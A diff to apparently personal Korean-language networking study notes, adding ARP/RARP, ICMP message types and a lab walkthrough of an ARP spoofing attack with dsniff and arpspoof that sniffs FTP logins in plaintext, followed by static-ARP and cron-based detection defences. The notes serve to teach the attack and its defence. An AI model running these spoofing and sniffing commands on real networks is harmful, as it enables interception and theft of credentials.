@@ -601,11 +601,53 @@
     * 계층 프로토콜
         - ARP/RARP, ICMP, IPv4/6, IPSec
             # ARP : IP > MAC
+                ~ RARP : MAC > IP
+                ~ 더 이상 안쓰임(RXE Boot + DHCP 로 대체)
             # ARP 설정 변경
                 ~ 리눅스 : arp -an(목록), -s(static), -d(delete)
                 ~ 윈도우 : arp -a(목록), netsh interface ip add "장비이름" "IP" "MAC"(static)
                                         netsh interface ip delete "장비이름" "IP"(delete)
-            # RARP : MAC > IP
+    * ARP Spoofing Attack
+        - 다른 공격 작업 전 선행 작업으로 사용
+        - Ethernet S/W 트래픽 변경 수단
+        <공격 과정>
+        - apt-get install -y dsniff
+        - IP Forwarding
+            # vi /etc/sysctl.conf
+              net.ipv4.ip_forward=1
+                ~ IPv4 Forwarding 기능 ON
+        - ARP Spoofing
+            # arpspoof -i eth1 -t 192.168.20.200 192.168.20.201
+            # arpspoof -i eth1 -t 192.168.20.201 192.168.20.200
+                ~ 양 장비들에게 자신의 MAC 주소로 스푸핑
+        - Sniffing
+            # dsniff -i eth1 -t 21/tcp=ftp host 192.168.20.200
+                ~ Win2012 > Linux200 FTP 접속 시 로그인 정보가 Kali 에서 Plaintext 로 확인
+        <방지 방법>
+        - 스크립트를 통한 NIC MAC Static
+            # 'ip addr' 를 통해 NIC MAC 확인
+            # 해당 MAC 주소를 'arp -s' 로 등록하는 스크립트를 생성
+            # vi /etc/rc.local 에서 부팅 시 자동 실행될 수 있게 스크립트 위치 입력
+                ~ chmod +x /etc/rc.local
+            # systemctl start rc-local.service
+            # reboot
+        - 스크립트를 통한 ARP Spoofing Attack Detection
+            # 'arp -an' 결과값에서 MAC 주소의 라인 개수를 중복값 없이 정렬 추출
+            # 그 값이 1 보다 크면 동일 MAC 주소에 2개 이상의 IP 가 설정되었다는 뜻
+                ~ ARP Spoofing Attack 징후
+            # 정상/비정상 결과를 로그로 기록하고 crontab 에 등록하여 백그라운드 실행
+    * ICMP(Internet Control Messages Protocol)
+        - ping
+            # 메시지
+                ~ 오류 type 3 : 목적지 도달 불가
+                    code 0) network(라우팅 경로 없음)
+                    code 1) host(최종 목적지 도달 불가)
+                    code 2) protocol(특정 프로토콜 사용 불가)
+                    code 3) port(특정 포트 사용 불가)
+                ~ 오류 type 5 : 경로 리다이렉트
+                ~ 쿼리 type 8 : 질문
+                ~ 쿼리 type 0 : 응답
+        - traceroute
 12. Transport Layer
     * 헤더(Port: TCP, UDP)
         - TCP : 흐름 제어(송신(Sliding Window)/수신(Congestion Window)) + 에러 제어(ACK)
